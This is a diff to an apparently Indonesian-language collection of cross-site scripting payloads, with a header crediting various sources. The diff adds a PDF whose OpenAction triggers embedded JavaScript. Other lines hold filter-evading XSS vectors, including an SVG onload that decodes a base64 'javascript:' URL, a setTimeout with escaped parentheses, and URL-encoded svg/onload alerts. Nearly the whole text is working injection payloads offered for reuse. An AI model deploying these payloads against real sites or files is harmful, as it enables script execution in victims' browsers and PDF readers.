@@ -4,6 +4,13 @@ PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 TOLONG DOAKAN PENULIS DAN PEMILIK PAYLOAD YANG PENULIS DAPATKAN DARI SUMBER MANAPUN, 
 SEMOGA BERKAH DAN MEMBAWA MANFAAT SELALU
 
+%PDF-1.7 
+ 1 0 obj 
+ <</Pages 1 0 R /OpenAction 
+ 2 0 R
+ >> 2 0 obj 
+ <</S /JavaScript /JS (app.alert(1)) >> trailer <</Root 1 0 R>>
+
 <svg/ONxss='0'/ONload=location=window['atob']'amF2YXNjcmlwdDphbGVydCgxKQ==';
 ">-setTimeout'\u0028alert(1)\u0029'-’
 %3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload=alert("XSS") > 
